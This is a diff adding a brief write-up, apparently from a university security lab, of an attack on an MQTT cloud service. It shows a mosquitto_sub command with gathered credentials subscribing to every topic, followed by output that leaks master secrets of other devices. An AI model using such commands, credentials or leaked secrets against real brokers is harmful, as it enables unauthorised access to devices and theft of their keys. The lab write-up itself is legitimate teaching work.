@@ -1,0 +1,13 @@
+To attack the cloud service we subscribed to MQTT using the credentials we previously gathered:
+ mosquitto_sub -h 'syssec.ewi.utwente.nl' -u 'wemos60' -P 'C9JFyl2h8L' -t '#' -v
+By subscribing to all topics we can read all the data sent over MQTT by this server.
+led/wemos03/action Pizzatime
+led/wemos32/action master_secret: 35bJ6m09tkUH216M
+led/wemos07/action master_secret: 62vGDk8ZmHNzKqeJ
+led/wemos19/action master_secret: F1s2tU88qGLt3p2n
+led/wemos08/action master_secret: I0juBgAeEHY33tl9
+led/wemos01/action 0
+ ....
+
+We can find the master secrets of 4 other devices on the network, as well as logs of the actions performed the devices.
+The devices only seem to perform action 0 and action 1.
